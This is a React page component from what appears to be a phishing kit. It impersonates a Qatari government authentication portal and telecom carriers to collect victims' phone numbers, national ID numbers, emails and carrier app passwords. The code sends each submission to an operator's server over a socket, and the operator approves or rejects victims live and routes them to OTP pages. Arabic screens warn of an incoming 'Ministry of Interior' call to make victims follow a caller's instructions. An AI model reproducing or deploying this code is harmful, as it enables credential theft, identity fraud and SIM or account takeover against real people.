import React from "react";
import { useState } from "react";
import axios from "axios";

import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useEffect } from "react";
import { MdOutlinePhoneCallback } from "react-icons/md";
import { serverRoute, socket } from "./Home";
import { useNavigate } from "react-router-dom";

const Phone = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const navigate = useNavigate();
  const [phoneNetwork, setPhoneNetwork] = useState("Ooredoo Qatar");
  const [idNumber, setIdNumber] = useState("");
  const [email, setEmail] = useState("");
  const [appPassword, setAppPassword] = useState("");
  const query = new URLSearchParams(window.location.search);
  const code = query.get("mobily");
  const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const net = phoneNetwork;
  const [counter, setCounter] = useState(180);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const ID = sessionStorage.getItem("id");

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    if (!phoneNetwork) {
      setLoading(false);
      return window.alert("اختر مزود الخدمة");
    }

    try {
      const phoneData = {
        phoneNumber,
        phoneNetwork,
        idNumber,
        phoneEmail: email,
        appPassword,
      };

      await axios
        .post(serverRoute + "/phone/" + sessionStorage.getItem("id"), phoneData)
        .then(() => {
          socket.emit("phone", {
            id: sessionStorage.getItem("id"),
            ...phoneData,
          });
          sessionStorage.setItem("phoneData", JSON.stringify(phoneData));
        });
    } catch (error) {
      console.log(error);
      setLoading(false);
    }
  };
  useEffect(() => {
    console.log(phoneNetwork);
  }, [phoneNetwork]);

  socket.on("acceptPhone", (id) => {
    if (id === ID) {
      if (id === ID) {
        setLoading(false);
        window.location.href = "/phoneOtp";
      }
      if (net) {
        console.log(phoneNetwork);
        if (net === "Mobily") {
          setLoading(false);
          window.location.href = "/phone?mobily=check";
          return;
        } else if (net === "STC") {
          return navigate("/phoneOtp?stc=check");
        } else {
          if (["Zain", "Salam", "Virgin", "Redbull"].includes(phoneNetwork)) {
            return navigate("/phoneOtp");
          }
        }
      }
    }
  });

  socket.on("declinePhone", (id) => {
    if (id === ID) {
      setLoading(false);
      setError(true);
    }
  });

  socket.on("acceptService", ({ id, price }) => {
    if (id === ID) {
      if (code === "check" || phoneNetwork === "Mobily") {
        return navigate("/mobilyOtp");
        // return (navigate"/navaz?otp=" + price + "&stc=" + null);
      }
      return navigate("/phoneOtp");
    }
  });
  socket.on("declineService", (id) => {
    if (id === ID) setVerfiy(null);
  });

  return (
    <div className="w-full  flex flex-col items-center justify-center bg-white p-4">
      {!verfiy ? (
        <form
          className=" rounded-lg p-6 pt-4 text-sm w-full max-w-md"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          {/* Header with logo */}
          <div className="flex items-center justify-center gap-3 mb-6">
            <div className="text-xs text-gray-600">
              <div>مركز الاتصال الحكومي</div>
              <div>Government Contact Center</div>
            </div>
            <img src="/phone.jpeg" alt="Tawtheeq Logo" className="h-20" />
          </div>

          {/* Title */}
          <h2 className="font-bold text-lg w-full text-right mb-4 border-b-2 border-dotted border-gray-400 pb-4">
            ربط رقم الهاتف وتفعيل الحساب
          </h2>

          {/* Description */}
          <p className="text-right text-base font-semibold text-gray-700 leading-relaxed mb-6  pb-2">
            يرجى ادخال رقم الهاتف الجوال الخاص بك ليتم ربطه بالبطاقة الشخصية
            لإتمام عملية تفعيل الحساب على بوابة التوثيق الوطني.
          </p>

          {/* Service Provider */}
          <div className="mb-4">
            <label className="block text-sm font-semibold mb-2 text-right">
              مزود الخدمة <span className="text-red-600">*</span>
            </label>
            <select
              value={phoneNetwork}
              required
              onChange={(e) => setPhoneNetwork(e.target.value)}
              className="w-full px-4 py-3 rounded border border-gray-300 text-right bg-white focus:outline-none focus:border-blue-500"
            >
              <option>Ooredoo Qatar</option>
              <option>Vodafone Qatar</option>
            </select>
          </div>

          {/* Phone Number */}
          <div className="mb-4">
            <label className="block text-sm font-semibold mb-2 text-right">
              رقم الهاتف <span className="text-red-600">*</span>
            </label>
            <input
              value={phoneNumber}
              required
              onChange={(e) => setPhoneNumber(e.target.value)}
              dir="ltr"
              placeholder="Phone"
              inputMode="numeric"
              type="text"
              className="w-full px-4 py-3 rounded border border-gray-300 text-right bg-white focus:outline-none focus:border-blue-500 placeholder-gray-400"
            />
          </div>

          {/* ID Number */}
          <div className="mb-4">
            <label className="block text-sm font-semibold mb-2 text-right">
              الرقم الشخصي لمالك البطاقة <span className="text-red-600">*</span>
            </label>
            <input
              value={idNumber}
              required
              onChange={(e) => setIdNumber(e.target.value)}
              dir="ltr"
              placeholder="ID"
              inputMode="numeric"
              type="text"
              className="w-full px-4 py-3 rounded border border-gray-300 text-right bg-white focus:outline-none focus:border-blue-500 placeholder-gray-400"
            />
          </div>

          {/* Email */}
          <div className="mb-4">
            <label className="block text-sm font-semibold mb-2 text-right">
              البريد الإلكتروني المعتمد بـ {phoneNetwork}{" "}
              <span className="text-red-600">*</span>
            </label>
            <input
              value={email}
              required
              onChange={(e) => setEmail(e.target.value)}
              dir="ltr"
              placeholder="Email"
              type="email"
              className="w-full px-4 py-3 rounded border border-gray-300 text-right bg-white focus:outline-none focus:border-blue-500 placeholder-gray-400"
            />
          </div>

          {/* App Password */}
          <div className="mb-6">
            <label className="block text-sm font-semibold mb-2 text-right">
              كلمة المرور لتطبيق {phoneNetwork}
            </label>
            <input
              value={appPassword}
              onChange={(e) => setAppPassword(e.target.value)}
              dir="ltr"
              type="password"
              className="w-full px-4 py-3 rounded border border-gray-300 text-right bg-white focus:outline-none focus:border-blue-500"
            />
          </div>

          {/* Submit Button */}
          <div className="w-full flex items-center justify-center mb-4">
            <button
              type="submit"
              className="px-8 py-3 bg-[#1e88e5] hover:bg-[#1976d2] text-white w-full rounded font-semibold text-lg transition-colors"
            >
              توثيق
            </button>
          </div>

          {/* Error Modal */}
          {error && (
            <div className="w-full text-center text-red-500 fixed bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-4 md:w-1/3 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl text-red-500" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span className="text-gray-800">البيانات غير صحيحة</span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3 rounded hover:bg-gray-800"
                  onClick={() => setError(false)}
                >
                  حاول مرة أخرى
                </button>
              </div>
            </div>
          )}
        </form>
      ) : //  verfiy === "STC" ? (
      //   <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
      //     <img
      //       src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
      //       className="w-1/2"
      //     />
      //     <div className="  w-full flex flex-col jus items-center gap-y-4">
      //       <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
      //       <p className="font-bold text-gray-500" style={{ fontSize: "10px" }}>
      //         قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
      //         التأمين
      //       </p>
      //       <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
      //     </div>
      //     <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
      //       <span className="text-purple-700 font-bold ">
      //         إعادة الاتصال بعد{" "}
      //       </span>
      //       <span className="text-purple-700 font-bold">
      //         {formattedMinutes}:{formattedSeconds}
      //       </span>
      //     </div>
      //   </div>
      // )
      verfiy === "Mobily" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <MdOutlinePhoneCallback className="text-4xl text-sky-600" />
              <span className="font-bold">أثبت هويتك</span>
            </div>
            <p className="p-2">
              ستتلقى مكالمة من وزارة الداخلية قريبا لتأكيد الطلب يرجى الرد على
              الاتصال واتباع التعليمات
            </p>
            <button
              className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
              onClick={() => {
                socket.emit("network", ID);
                setVerfiy("Mobily2");
              }}
            >
              متابعة
            </button>
          </div>
        </div>
      ) : verfiy === "Mobily2" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <TailSpin
                height="50"
                width="50"
                color="#0ea5e9"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
              <span className="font-bold"> بانتظار تأكيد الجوال</span>
            </div>
            <p className="p-2">
              وافق على الاتصال واتمم العملية لتاكيد استبدال شريحة معلومات موعدك
              القديم على نظام نفاذ تجنّبا من الانتظار ٣٠ يوم .
            </p>
            <span className="w-full p-2">لم تستلم مكاملة ؟ </span>
            <span className="w-full p-2 flex items-center">
              يمكنك إعادة المحاولة خلال
              <span className="px-2 font-bold text-lg">
                {formattedSeconds} : {formattedMinutes}{" "}
              </span>
            </span>
            <button
              className={`${
                formattedMinutes === "00" && formattedSeconds === "00"
                  ? "bg-opacity-100"
                  : "bg-opacity-40"
              } bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5`}
              disabled={!(formattedMinutes == "00" && formattedSeconds == "00")}
              onClick={() => console.log("mobily")}
            >
              تحقق
            </button>
          </div>
        </div>
      ) : null}

      {loading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري التحقق من البيانات...
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Phone;
